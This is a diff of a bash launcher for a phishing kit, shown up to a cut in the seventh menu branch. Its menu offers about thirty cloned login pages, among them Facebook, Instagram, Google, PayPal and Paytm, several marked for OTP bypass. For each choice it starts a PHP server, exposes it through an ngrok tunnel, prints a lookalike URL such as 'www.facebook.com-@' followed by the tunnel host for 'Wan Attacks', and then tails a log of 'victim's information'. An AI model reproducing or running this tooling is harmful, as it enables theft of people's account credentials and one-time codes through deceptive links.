@@ -1,1611 +1,1018 @@
 #!/bin/bash
 clear
-echo ""
-echo ""
-printf "\e[100;330m[\e[10m **** ]\e[1;40m\e[10m NGROK SERVER :\e[1;32m TURN ON MOBILE DATA & HOTSPOT OTHERWISE IT WILL NOT WORK !\e[0m"
-sleep 4
-echo ""
-clear
-echo ""
-echo ""
-echo ""
-read -p $'\e[1;40m\e[96m E D U C A T I O N A l  P U R P O S E S  O N L Y ? \e[1;91m (Y/N) : \e[0m' option
-echo""
-echo""
-echo""
-
-if [[ $option == *'N'* ]]; then
-clear
-exit
-fi
-if [[ $option == *'n'* ]]; then
-clear
-exit
-fi
+#clolors
+## ANSI colors (FG & BG)
+RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
+MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
+REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
+MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
+RESETBG="$(printf '\e[0m\n')"
 
 php="$(ps -efw | grep php | grep -v grep | awk '{print $2}')"
 ngrok="$(ps -efw | grep ngrok | grep -v grep | awk '{print $2}')"
 kill -9 $php
 kill -9 $ngrok
 clear
-bash Logo.sh
-cat Logo.txt | lolcat
-echo ""
-echo ""
- 
-                 echo -e $'\e[1;33m[\e[0m\e[1;33m *** \e[0m\e[1;96m]\e[0m\e[1;96m        ---------------      \e[1;33m  [ ]\e[0m'   
-                 read -p $'\e[1;91m[\e[0m\e[1;91m *** \e[0m\e[1;96m]\e[0m\e[1;96m    What You Want to Choose  \e[1;91m  > > > > > \e[0m' option
+
+logo() {
+	cat <<- EOF
+		${ORANGE}                        wake up, Christian
+		${ORANGE}                Lord God Jesus Christ L❤️.VE'S you
+		${ORANGE}                     follow the white Pigeon.
+		${ORANGE}                       knock, knock, knock,
+		${ORANGE}                           🎲Man Of God. 
+		${BLUE}           __                 _____ _____     _     _
+		${BLUE}        __|  |___ ___ _ _ ___|     |  |  |___|_|___| |_
+		${BLUE}       |  |  | -_|_ -| | |_ -|   --|     |  _| |_ -|  _|
+		${BLUE}       |_____|___|___|___|___|_____|__|__|_| |_|___|_|
+		${RED}                           ¯\_(ツ)_/¯
+	EOF
+}
+
+menu() {
+cat <<- EOF
+		${GREEN} [01] Tiktok              [12] Linkedin-TFO    [23] Wordpress
+		${GREEN} [02] Facebook-TFO        [13] Hotstar-TFO     [24] Snapchat-TFO 
+		${GREEN} [03] Instagram-TFO       [14] Spotify-TFO     [25] Protonmail-TFO
+		${GREEN} [04] Uber Eats-TFO       [15] Github-TFO      [26] Stackoverflow
+		${GREEN} [05] OLA-TFO             [16] IPFinder        [27] ebay-TFO
+		${GREEN} [06] Google-TFO          [17] Zomato-TFO      [28] Twitch-TFO
+		${GREEN} [07] Paytm-TFO           [18] PhonePay-TFO    [29] Ajio-TFO
+		${GREEN} [08] Netflix-TFO         [19] Paypal-TFO      [30] Cryptocurrency
+		${GREEN} [09] Instagram-Followers [20] Telegram-TFO    [31] Mobikwik-TFO
+		${GREEN} [10] Amazon-TFO          [21] Twitter-TFO     [32] Pinterest
+		${GREEN} [11] WhatsApp-TFO        [22] Flipcart-TFO    [0] Exit
+	EOF
+      }
+      logo
+      echo""
+      menu
                  echo ""
-		 if [ $option = 01 ] || [ $option = 1 ]
+                 read -p $"${GREEN}[${WHITE}+${GREEN}]${CYAN} What Is Your Choice: ${WHITE}" option
+         if [ $option = 01 ] || [ $option = 1 ]
                  then 
                            cd sites/ 
                            cd tiktok/
-                           echo ""
-                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
-                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
+                           echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
+                           php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                            sleep 3
-                           echo ""
-                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
-                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
+                           echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                            ./ngrok http 4444 > /dev/null 2>&1 &
-                           sleep 25
-                           clear
+                           sleep 9
                            echo ""
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
-                           echo ""
-                           echo ""
-                           cat secnhack
-                           echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
-                           echo ""
-                           echo "" 
-                           read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
-                           echo ""
+                           read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                            if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                            then
-                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                           printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://www.tiktok.com-@$link                                    
-                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                           printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link: %s${ORANGE}" https://www.tiktok.com-@$link
+                           echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                            else
-                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                           printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
-                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                           printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
+                           echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                            fi
-                           
+                           echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                            if [[ -e log.txt ]]; then
                            > log.txt
                            fi 
                            echo ""
-                           echo ""
                            tail -f log.txt 
 
-                
-	          break;
+              break;
                   elif [ $option = 02 ] || [ $option = 2 ]
-	          then
-	                   cd sites/
+              then
+                       cd sites/
                            cd facebook/         
-                           echo ""
-                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
-                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
+                           echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
+                           php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                            sleep 3
-                           echo ""
-                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
-                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
+                           echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                            ./ngrok http 4444 > /dev/null 2>&1 &
-                           sleep 25
-                           clear
+                           sleep 9
                            echo ""
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
-                           echo ""
-                           echo ""
-                           cat secnhack
-                           echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
-                           echo ""
-                           echo "" 
-                           read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
-                           echo ""
+                           read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                            if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                            then
-                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                           printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://www.facebook.com-@$link                                    
-                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                           printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://www.facebook.com-@$link
+                           echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                            else
-                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                           printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
-                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                           printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
+                           echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                            fi
-                           
+                           echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                            if [[ -e log.txt ]]; then
                            > log.txt
                            fi 
                            echo ""
-                           echo ""
                            tail -f log.txt 
-
 
                   break;
                   elif [ $option = 03 ] || [ $option = 3 ]
-	          then
+              then
                            cd sites/
                            cd instagram/
-                           echo ""
-                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
-                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
+                           echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
+                           php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                            sleep 3
-                           echo ""
-                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
-                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
+                           echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                            ./ngrok http 4444 > /dev/null 2>&1 &
-                           sleep 25
-                           clear
+                           sleep 9
                            echo ""
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
-                           echo ""
-                           echo ""
-                           cat secnhack
-                           echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
-                           echo ""
-                           echo "" 
-                           read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
-                           echo ""
+                           read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                            if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                            then
-                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                           printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://www.instagram.com-@$link                                    
-                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                           printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://www.instagram.com-@$link
+                           echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                            else
-                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                           printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
-                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                           printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
+                           echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                            fi
-                           
+                           echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                            if [[ -e log.txt ]]; then
                            > log.txt
                            fi 
                            echo ""
-                           echo ""
-                           tail -f log.txt 
- 
-                  
+                           tail -f log.txt
+
                  break;
                  elif [ $option = 04 ] || [ $option = 4 ]
-	         then
+             then
                            cd sites/
                            cd UberEats-Phishing/
-                           echo ""
-                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
-                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
+                           echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
+                           php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                            sleep 3
-                           echo ""
-                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
-                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
+                           echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                            ./ngrok http 4444 > /dev/null 2>&1 &
-                           sleep 25
-                           clear
+                           sleep 9
                            echo ""
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
-                           echo ""
-                           echo ""
-                           cat secnhack
-                           echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
-                           echo ""
-                           echo "" 
-                           read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
-                           echo ""
+                           read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                            if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                            then
-                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                           printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://www.ubereats.com-@$link                                    
-                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                           printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://www.ubereats.com-@$link
+                           echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                            else
-                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                           printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
-                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                           printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
+                           echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                            fi
-                           
+                           echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                            if [[ -e log.txt ]]; then
                            > log.txt
                            fi 
                            echo ""
-                           echo ""
                            tail -f log.txt 
-                  
-                  
-                  
+
                 break;
                 elif [ $option = 05 ] || [ $option = 5 ]
-	        then 
+            then 
                            cd sites/
                            cd ola-otpbypass/
-                           echo ""
-                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
-                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
+                           echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
+                           php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                            sleep 3
-                           echo ""
-                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
-                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
+                           echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                            ./ngrok http 4444 > /dev/null 2>&1 &
-                           sleep 25
-                           clear
+                           sleep 9
                            echo ""
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
-                           echo ""
-                           echo ""
-                           cat secnhack
-                           echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
-                           echo ""
-                           echo "" 
-                           read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
-                           echo ""
+                           read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                            if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                            then
-                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                           printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://www.olacabs.com-@$link                                    
-                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                           printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://www.olacabs.com-@$link
+                           echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                            else
-                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                           printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
-                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                           printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
+                           echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                            fi
-                           
+                           echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                            if [[ -e log.txt ]]; then
                            > log.txt
                            fi 
                            echo ""
-                           echo ""
-                           tail -f log.txt 
-                  
+                           tail -f log.txt
                  break;
                  elif [ $option = 06 ] || [ $option = 6 ]
-	         then
-                
+             then
                            cd sites/
                            cd google-otp/
-                           echo ""
-                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
-                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
+                           echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
+                           php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                            sleep 3
-                           echo ""
-                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
-                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
+                           echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                            ./ngrok http 4444 > /dev/null 2>&1 &
-                           sleep 25
-                           clear
+                           sleep 9
                            echo ""
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
-                           echo ""
-                           echo ""
-                           cat secnhack
-                           echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
-                           echo ""
-                           echo "" 
-                           read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
-                           echo ""
+                           read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                            if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                            then
-                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                           printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://google.com-login-@$link                                    
-                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                           printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://google.com-login-@$link
+                           echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                            else
-                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                           printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
-                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                           printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
+                           echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                            fi
-                           
+                           echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                            if [[ -e log.txt ]]; then
                            > log.txt
                            fi 
                            echo ""
-                           echo ""
-                           tail -f log.txt 
-                  
-
-
+                           tail -f log.txt
                 break;
                 elif [ $option = 07 ] || [ $option = 7 ]
-	        then
-                          clear
+            then
                           cd sites/
-                          cd Paytm-Phishing/
+                          cd phonepay/
+                          echo
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}] 1.${WHITE}${ORANGE} Paytm Sign In..."${WHITE}
+              echo
+                          echo -ne "${GREEN}[${WHITE}+${GREEN}] 2.${WHITE}${ORANGE} Paytm Sign UP...\n"${WHITE}
                           echo 
-                          echo -e "\e[1;31m[\e[0m\e[1;77m 1 \e[0m\e[1;31m]\e[0m\e[1;32m Paytm Sign In \e[0m" 
-			  echo
-                          echo -e "\e[1;31m[\e[0m\e[1;77m 2 \e[0m\e[1;31m]\e[0m\e[1;32m Paytm Sign UP \e[0m"
-                          echo 
-                          read -p $'\e[1;91m[\e[0m\e[1;92m >>> \e[0m\e[1;91m]\e[0m\e[1;92m Enter Your Choice : \e[0m' option1
-		          if [ $option1 = 1 ] || [ $option1 = 01 ]
-			  then
-                          
-                          echo ""
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
+                          read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Enter Your Choice ${WHITE}(1 0r 2): " option1
+                  if [ $option1 = 1 ] || [ $option1 = 01 ]
+              then
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
+                          php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                           sleep 3
-                          echo ""
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                           ./ngrok http 4444 > /dev/null 2>&1 &
-                          sleep 25
-                          clear
+                          sleep 9
                           echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
-                          echo ""
-                          echo ""
-                          cat secnhack
-                          echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
-                          echo ""
-                          echo "" 
-                          read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
-                          echo ""
+                          read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                           if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                           then
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
